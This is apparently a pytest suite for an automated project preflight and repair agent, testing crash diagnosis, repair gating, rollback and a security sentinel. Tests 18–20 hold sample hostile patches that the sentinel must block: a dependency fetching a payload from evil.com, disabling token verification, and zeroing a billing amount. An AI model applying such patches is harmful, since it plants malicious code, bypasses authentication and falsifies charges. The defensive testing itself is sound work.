"""
JARVIS OS — Phase 53: Universal Project Preflight & Runtime Failure Auto-Recovery
Unit Test Suite: 24 comprehensive scenarios verifying preflight analysis, runtime diagnostics,
safe atomic repair planning, policy authorization gates, security sentinel sovereignty, and rollback.
"""

import json
import os
import tempfile
import pytest

from agents.project_preflight import (
    ConfigValidator,
    DependencyValidator,
    DeterministicFailureCache,
    DiagnosticErrorClass,
    EntrypointValidator,
    FailureFingerprint,
    HealthcheckEngine,
    IssueSeverity,
    JavaScriptPreflightAnalyzer,
    PreflightGateDecision,
    PreflightPolicy,
    PreflightPolicyEngine,
    PreflightProofValidator,
    PreflightSecuritySentinel,
    PreflightTelemetry,
    ProjectPreflightBridge,
    ProjectProfileDetector,
    PythonPreflightAnalyzer,
    RepairCategory,
    RepairConfidence,
    RuntimeDiagnosticEngine,
    SafeRepairPlanner,
    SecurityVetoError,
    StartupHealthResult,
)


@pytest.fixture
def bridge():
    return ProjectPreflightBridge()


@pytest.fixture
def tmp_dir():
    with tempfile.TemporaryDirectory() as d:
        yield d


# 1. JS syntax failure
def test_01_js_syntax_failure(tmp_dir):
    bad_js = os.path.join(tmp_dir, "bad.js")
    with open(bad_js, "w", encoding="utf-8") as f:
        f.write("function broken( { return 123; }")  # missing paren
    
    analyzer = JavaScriptPreflightAnalyzer()
    detector = ProjectProfileDetector()
    profile = detector.detect_profile(tmp_dir)
    issues = analyzer.analyze_file(bad_js, profile)
    assert any(i.severity == IssueSeverity.BLOCKER for i in issues)
    assert any("sintaxe" in i.message.lower() or "syntax" in i.message.lower() for i in issues)


# 2. ReferenceError detection
def test_02_reference_error_diagnosis():
    engine = RuntimeDiagnosticEngine()
    log = (
        "ReferenceError: app is not defined\n"
        "    at Object.<anonymous> (C:\\projects\\dina\\app.js:79:1)\n"
    )
    diag = engine.diagnose_crash(log)
    assert diag is not None
    assert diag.error_class == DiagnosticErrorClass.REFERENCE_ERROR
    assert diag.symbol == "app"
    assert diag.line == 79
    assert diag.confidence >= 0.90


# 3. Missing import detection
def test_03_missing_import_preflight(tmp_dir):
    js_file = os.path.join(tmp_dir, "service.js")
    with open(js_file, "w", encoding="utf-8") as f:
        f.write("const data = axios.get('https://api.example.com');\n")
    
    analyzer = JavaScriptPreflightAnalyzer()
    detector = ProjectProfileDetector()
    profile = detector.detect_profile(tmp_dir)
    issues = analyzer.analyze_file(js_file, profile)
    assert any(i.category == "IMPORT_MISSING" and i.symbol == "axios" for i in issues)


# 4. Missing dependency (Cannot find module)
def test_04_missing_dependency_diagnosis():
    engine = RuntimeDiagnosticEngine()
    log = "Error: Cannot find module 'express'\nRequire stack:\n- C:\\projects\\dina\\app.js"
    diag = engine.diagnose_crash(log)
    assert diag is not None
    assert diag.error_class == DiagnosticErrorClass.MODULE_NOT_FOUND
    assert diag.symbol == "express"


# 5. Python NameError
def test_05_python_name_error_diagnosis():
    engine = RuntimeDiagnosticEngine()
    log = (
        'Traceback (most recent call last):\n'
        '  File "app.py", line 42, in <module>\n'
        "    result = calculate_tax(100)\n"
        "NameError: name 'calculate_tax' is not defined\n"
    )
    diag = engine.diagnose_crash(log)
    assert diag is not None
    assert diag.error_class == DiagnosticErrorClass.NAME_ERROR
    assert diag.symbol == "calculate_tax"
    assert diag.line == 42


# 6. Python ModuleNotFoundError
def test_06_python_module_not_found_diagnosis():
    engine = RuntimeDiagnosticEngine()
    log = (
        'Traceback (most recent call last):\n'
        '  File "main.py", line 2, in <module>\n'
        "    import fastapi\n"
        "ModuleNotFoundError: No module named 'fastapi'\n"
    )
    diag = engine.diagnose_crash(log)
    assert diag is not None
    assert diag.error_class == DiagnosticErrorClass.IMPORT_ERROR
    assert diag.symbol == "fastapi"


# 7. Invalid entrypoint
def test_07_invalid_entrypoint(tmp_dir):
    validator = EntrypointValidator()
    detector = ProjectProfileDetector()
    pkg_json = os.path.join(tmp_dir, "package.json")
    with open(pkg_json, "w", encoding="utf-8") as f:
        json.dump({"name": "test", "main": "missing_app.js"}, f)
    
    profile = detector.detect_profile(tmp_dir)
    profile.entrypoint = "missing_app.js"
    issues = validator.validate_entrypoint(tmp_dir, profile)
    assert any(i.severity == IssueSeverity.BLOCKER and "missing_app.js" in i.message for i in issues)


# 8. Missing start script
def test_08_missing_start_script(tmp_dir):
    validator = EntrypointValidator()
    detector = ProjectProfileDetector()
    pkg_json = os.path.join(tmp_dir, "package.json")
    with open(pkg_json, "w", encoding="utf-8") as f:
        json.dump({"name": "test", "scripts": {"build": "webpack"}}, f)
    
    profile = detector.detect_profile(tmp_dir)
    profile.entrypoint = None
    issues = validator.validate_entrypoint(tmp_dir, profile)
    assert any(i.category == "START_SCRIPT_MISSING" for i in issues)


# 9. Port conflict (EADDRINUSE)
def test_09_port_conflict_diagnosis():
    engine = RuntimeDiagnosticEngine()
    log = "Error: listen EADDRINUSE: address already in use ::: 3000"
    diag = engine.diagnose_crash(log)
    assert diag is not None
    assert diag.error_class == DiagnosticErrorClass.PORT_CONFLICT
    assert diag.symbol == "3000"


# 10. Startup timeout
def test_10_startup_timeout():
    engine = HealthcheckEngine()
    # Port 59999 is unlikely to be listening, timeout after 0.2s
    res = engine.probe_health(port=59999, timeout_seconds=0.2)
    assert not res.ready
    assert "Timeout" in (res.failure_reason or "")


# 11. Healthcheck failure on dead process
def test_11_healthcheck_failure_on_exited_process():
    class DummyProcess:
        returncode = 1
        def poll(self):
            return 1

    engine = HealthcheckEngine()
    res = engine.probe_health(port=3000, process=DummyProcess())
    assert not res.ready
    assert "exited" in (res.failure_reason or "").lower()


# 12. Deterministic diagnosis
def test_12_deterministic_diagnosis():
    engine = RuntimeDiagnosticEngine()
    log = "ReferenceError: app is not defined\n    at Object.<anonymous> (app.js:79:1)"
    diag1 = engine.diagnose_crash(log)
    diag2 = engine.diagnose_crash(log)
    assert diag1 is not None and diag2 is not None
    assert diag1.diagnostic_id == diag2.diagnostic_id


# 13. High confidence repair
def test_13_high_confidence_repair(tmp_dir):
    app_js = os.path.join(tmp_dir, "app.js")
    with open(app_js, "w", encoding="utf-8") as f:
        f.write("app.post('/ddos', (req, res) => res.json({}));\n")
    
    detector = ProjectProfileDetector()
    profile = detector.detect_profile(tmp_dir)
    profile.entrypoint = "app.js"
    
    engine = RuntimeDiagnosticEngine()
    diag = engine.diagnose_crash("ReferenceError: app is not defined\n    at Object.<anonymous> (app.js:1:1)")
    diag.file_path = app_js
    
    planner = SafeRepairPlanner()
    plan = planner.plan_repair(diag, tmp_dir, profile)
    assert plan is not None
    assert plan.confidence == RepairConfidence.HIGH_CONFIDENCE
    assert plan.category == RepairCategory.MIDDLEWARE_MISSING


# 14. Medium confidence repair
def test_14_medium_confidence_repair(tmp_dir):
    pkg_json = os.path.join(tmp_dir, "package.json")
    with open(pkg_json, "w", encoding="utf-8") as f:
        json.dump({"name": "test", "dependencies": {}}, f)
    
    detector = ProjectProfileDetector()
    profile = detector.detect_profile(tmp_dir)
    
    engine = RuntimeDiagnosticEngine()
    diag = engine.diagnose_crash("Error: Cannot find module 'rare-custom-lib'")
    diag.file_path = pkg_json
    diag.confidence = 0.80
    
    planner = SafeRepairPlanner()
    plan = planner.plan_repair(diag, tmp_dir, profile)
    if plan:
        assert plan.confidence in (RepairConfidence.MEDIUM_CONFIDENCE, RepairConfidence.LOW_CONFIDENCE)


# 15. Low confidence repair blocked
def test_15_low_confidence_repair_blocked():
    policy_engine = PreflightPolicyEngine()
    from agents.project_preflight.models import RepairPlan, RepairCategory
    plan = RepairPlan(
        repair_id="rep_low",
        diagnostic_id="diag_low",
        category=RepairCategory.IMPORT_MISSING,
        confidence=RepairConfidence.LOW_CONFIDENCE,
        reason="Ambiguous fix",
    )
    decision, reason = policy_engine.evaluate_repair_gate(plan, PreflightPolicy.STANDARD, attempt_number=1)
    assert decision == PreflightGateDecision.EXECUTION_BLOCKED
    assert "LOW_CONFIDENCE" in reason


# 16. Repair rollback restores original content
def test_16_repair_rollback_restores_original_content(tmp_dir):
    test_file = os.path.join(tmp_dir, "app.js")
    original = "console.log('original code');\n"
    with open(test_file, "w", encoding="utf-8") as f:
        f.write(original)
    
    planner = SafeRepairPlanner()
    from agents.project_preflight.models import RepairPlan, FilePatch
    plan = RepairPlan(
        repair_id="rep_test",
        diagnostic_id="diag_test",
        category=RepairCategory.IMPORT_MISSING,
        confidence=RepairConfidence.HIGH_CONFIDENCE,
        reason="Test patch",
        file_patches=[
            FilePatch(
                relative_path="app.js",
                original_content=original,
                patched_content="console.log('patched code');\n",
                reason="patch",
            )
        ],
    )
    
    # Apply patch
    assert planner.apply_repair(plan, tmp_dir)
    with open(test_file, "r", encoding="utf-8") as f:
        assert f.read() == "console.log('patched code');\n"
        
    # Rollback patch
    assert planner.rollback_repair(plan, tmp_dir)
    with open(test_file, "r", encoding="utf-8") as f:
        assert f.read() == original


# 17. Recovery retry limit
def test_17_recovery_retry_limit():
    policy_engine = PreflightPolicyEngine()
    from agents.project_preflight.models import RepairPlan, RepairCategory
    plan = RepairPlan(
        repair_id="rep_test",
        diagnostic_id="diag_test",
        category=RepairCategory.MIDDLEWARE_MISSING,
        confidence=RepairConfidence.HIGH_CONFIDENCE,
        reason="Test",
    )
    # STANDARD allows 3 attempts; attempt 4 must be BLOCKED
    decision, reason = policy_engine.evaluate_repair_gate(plan, PreflightPolicy.STANDARD, attempt_number=4)
    assert decision == PreflightGateDecision.EXECUTION_BLOCKED
    assert "Limite máximo de tentativas" in reason


# 18. Package poisoning blocked by Sentinel
def test_18_package_poisoning_blocked():
    sentinel = PreflightSecuritySentinel()
    from agents.project_preflight.models import RepairPlan, FilePatch, RepairCategory
    plan = RepairPlan(
        repair_id="rep_poison",
        diagnostic_id="diag_poison",
        category=RepairCategory.DEPENDENCY_MISSING,
        confidence=RepairConfidence.HIGH_CONFIDENCE,
        reason="Malicious package insertion",
        file_patches=[
            FilePatch(
                relative_path="package.json",
                original_content='{"dependencies": {}}',
                patched_content='{"dependencies": {"malicious-exfiltrate": "http://evil.com/payload.sh"}}',
                reason="add dependency",
            )
        ],
    )
    with pytest.raises(SecurityVetoError) as exc_info:
        sentinel.inspect_repair_plan(plan)
    assert "package poisoning" in str(exc_info.value).lower()


# 19. Auth downgrade blocked by Sentinel
def test_19_auth_downgrade_blocked():
    sentinel = PreflightSecuritySentinel()
    from agents.project_preflight.models import RepairPlan, FilePatch, RepairCategory
    plan = RepairPlan(
        repair_id="rep_auth",
        diagnostic_id="diag_auth",
        category=RepairCategory.CONFIG_MISSING,
        confidence=RepairConfidence.HIGH_CONFIDENCE,
        reason="Auth patch",
        file_patches=[
            FilePatch(
                relative_path="auth.py",
                original_content="verify_token = True",
                patched_content="verify_token = False",
                reason="bypass auth",
            )
        ],
    )
    with pytest.raises(SecurityVetoError) as exc_info:
        sentinel.inspect_repair_plan(plan, is_security_critical=True)
    assert "rebaixamento de autorização" in str(exc_info.value).lower()


# 20. Economic mutation blocked by Sentinel
def test_20_economic_mutation_blocked():
    sentinel = PreflightSecuritySentinel()
    from agents.project_preflight.models import RepairPlan, FilePatch, RepairCategory
    plan = RepairPlan(
        repair_id="rep_econ",
        diagnostic_id="diag_econ",
        category=RepairCategory.CONFIG_MISSING,
        confidence=RepairConfidence.HIGH_CONFIDENCE,
        reason="Economic logic change",
        file_patches=[
            FilePatch(
                relative_path="billing.py",
                original_content="amount = price * qty",
                patched_content="amount = 0.0 # free",
                reason="alter amount",
            )
        ],
    )
    with pytest.raises(SecurityVetoError) as exc_info:
        sentinel.inspect_repair_plan(plan, is_economic=True)
    assert "lógica econômica" in str(exc_info.value).lower()


# 21. Browser recovery simulation
def test_21_browser_recovery_simulation(tmp_dir, bridge):
    html_path = os.path.join(tmp_dir, "index.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write("<!DOCTYPE html><html><body><h1>Project</h1></body></html>")
    
    res = bridge.run_preflight(tmp_dir, "browser_proj")
    assert res.can_proceed
    profile = bridge.index.get_profile("browser_proj")
    assert profile is not None
    assert profile.entrypoint == "index.html"


# 22. Memory influence (consultive lookup)
def test_22_memory_influence():
    cache = DeterministicFailureCache()
    fp = FailureFingerprint(
        runtime="NODE_CJS",
        error_class="REFERENCE_ERROR",
        file_name="app.js",
        line=79,
        symbol="app",
        normalized_message="ReferenceError: app is not defined",
    )
    from agents.project_preflight.models import RepairPlan, RepairCategory
    plan = RepairPlan(
        repair_id="rep_memory",
        diagnostic_id="diag_mem",
        category=RepairCategory.MIDDLEWARE_MISSING,
        confidence=RepairConfidence.HIGH_CONFIDENCE,
        reason="Memory pattern",
    )
    h = cache.record_repair_outcome(fp, plan, success=True)
    assert h.startswith("fp_")
    
    found = cache.lookup_known_repair(fp)
    assert found is not None
    assert found["success"] is True
    assert found["success_count"] == 1


# 23. Predictive impact divergence check
def test_23_predictive_impact_divergence():
    telemetry = PreflightTelemetry()
    ev = telemetry.emit_event(
        "repair_applied",
        project_id="dina",
        provenance={"predicted_files": ["app.js"], "actual_files": ["app.js"]},
    )
    assert ev["project_id"] == "dina"
    assert ev["phase"] == 53


# 24. Behavioral verification after repair
def test_24_behavioral_verification_after_repair():
    validator = PreflightProofValidator()
    from agents.project_preflight.models import RepairPlan, RepairCategory, StartupHealthResult
    plan = RepairPlan(
        repair_id="rep_smoke",
        diagnostic_id="diag_smoke",
        category=RepairCategory.MIDDLEWARE_MISSING,
        confidence=RepairConfidence.HIGH_CONFIDENCE,
        reason="Smoke test",
    )
    health = StartupHealthResult(
        started=True,
        ready=True,
        port=3000,
        status_code=200,
        latency_ms=3.5,
    )
    ok, msg = validator.evaluate_post_repair_proof(plan, health, smoke_behavior_ok=True)
    assert ok is True
    assert "verificada com sucesso" in msg
